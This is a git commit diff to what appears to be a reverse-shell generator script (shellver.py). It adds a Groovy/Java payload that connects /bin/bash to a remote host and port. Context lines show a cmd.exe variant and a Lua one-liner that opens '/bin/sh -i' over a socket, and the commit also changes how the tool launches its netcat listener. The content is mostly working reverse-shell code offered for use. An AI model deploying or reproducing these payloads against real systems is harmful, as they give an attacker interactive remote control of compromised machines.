b31ff1e5b307c66cfbbdc21a8b89b4989eda95ac
Jonas Wendorf <15037703+jonasw234@users.noreply.github.com>
2020-08-19 19:15:09 +0200

    Add Java Groovy command for Linux, fix listener spawning

--- shellver.py
+++ shellver.py
@@ -160,8 +160,13 @@ p.waitFor()
 ║ String host="xxx";
 int port=yyy;
 String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" + linux_color + r"""
+╠═══════════════════════════════════════════════════
+║ String host="xxx";
+int port=yyy;
+String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-╚═══════════════════════════════════════════════════""" + linux_color + r"""
+╚═══════════════════════════════════════════════════
 
 ╔LUA═════════╦══════════════════════════════════════
 ║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """ + both_color + r"""
@@ -176,7 +181,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     if os.geteuid() != 0 and int(port) < 1024:
         command.append('sudo')
     command.extend(['nc', '-lvnp', port])
-    Popen(command)
+    Popen(command).communicate()
 
 
 def payload():
@@ -308,7 +313,7 @@ run -j""")
     if os.geteuid() != 0 and int(port) < 1024:
         command.append('sudo ')
     command.extend(spawn_shell)
-    Popen(command)
+    Popen(command).communicate()
 
 
 def banner():
